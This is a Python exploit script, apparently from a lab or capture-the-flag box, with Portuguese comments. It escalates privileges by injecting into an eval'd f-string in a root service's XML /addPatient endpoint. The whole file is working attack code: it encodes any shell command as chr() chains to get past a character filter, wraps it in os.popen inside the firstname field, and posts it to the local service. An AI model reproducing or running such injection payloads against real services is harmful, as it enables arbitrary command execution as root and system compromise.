#!/usr/bin/env python3
# Privesc: f-string injection em notif.py (root, 127.0.0.1:54321)
# Campo firstname e inserido no template e avaliado via eval(f'''...''').
# Regex permite {}()+./ e aspas mas nao espacos -> chr()+chr() constroi o comando.
import urllib.request, sys

cmd = sys.argv[1]
chr_chain = "+".join(f"chr({ord(c)})" for c in cmd)
payload = "{os.popen(" + chr_chain + ").read()}"

xml = f"""<patient>
  <timestamp>20250919120000</timestamp>
  <sender_app>TEST</sender_app>
  <id>1234</id>
  <firstname>{payload}</firstname>
  <lastname>Doe</lastname>
  <birth_date>01/01/1990</birth_date>
  <gender>M</gender>
</patient>"""

req = urllib.request.Request("http://127.0.0.1:54321/addPatient",
    data=xml.encode(), headers={"Content-Type": "text/plain"})
print(urllib.request.urlopen(req).read().decode())
